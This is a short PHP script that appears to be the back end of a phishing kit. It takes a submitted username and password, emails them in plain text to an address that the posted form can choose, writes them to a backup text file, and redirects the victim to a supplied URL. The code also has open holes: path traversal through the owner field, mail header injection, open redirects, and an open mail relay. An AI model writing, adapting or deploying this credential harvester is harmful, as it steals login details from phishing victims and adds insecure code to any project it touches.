<?php
if(isset($_POST['senda'])){
	$senda = $_POST;

	$sender = '"SenDa"<bot@dbur.ga>';
	if(!empty($senda['_receiver'])){$receiver = $senda['_receiver'];} else {$receiver = '"dburga™"<admin@dbur.ga>';}
	if(!empty($senda['_reply'])){$reply = $senda['_reply'];} else {$reply = $sender;}
	$via = '-freturn@dbur.ga';
	if(!empty($senda['_subject'])){$subject = $senda['_subject'];} else {$subject = 'SenDa-'.mt_rand();}

	$message = 'Dear '.$senda['_owner'].','.PHP_EOL.PHP_EOL.
		'Your form submission contained the following information.'.PHP_EOL.
		'Username: '.$senda['username'].PHP_EOL.
		'Password: '.$senda['password'].PHP_EOL;
	if(!empty($_SERVER['HTTP_REFERER'])){
		$message .= PHP_EOL.$_SERVER['HTTP_REFERER'];
	}

	$headers = 'From: '.$sender.PHP_EOL.'Reply-To: '.$reply.PHP_EOL.'X-Mailer: PHP/' . phpversion();

	
	$isfile = 'backup/';
	if(!empty($senda['_owner'])){$isfile .= $senda['_owner'];} else {$isfile .= 'SenDa';}
	$isfile.='.txt';
	$write = '';
	if(!file_exists($isfile)){$write .= $senda['_success'].PHP_EOL.PHP_EOL;}
	$write .= 'USERNAME: '.$senda['username'].' PASSWORD: '.$senda['password'].PHP_EOL;
	$fp = fopen($isfile, 'a');
	fwrite($fp, $write);
	fclose($fp);

	if(@mail($receiver, $subject, $message, $headers, $via)){
		header("Location: ".$senda['_success']);
		exit;
	} else {
		header("Location: ".$senda['_failed']);
		exit;
	}
}
?>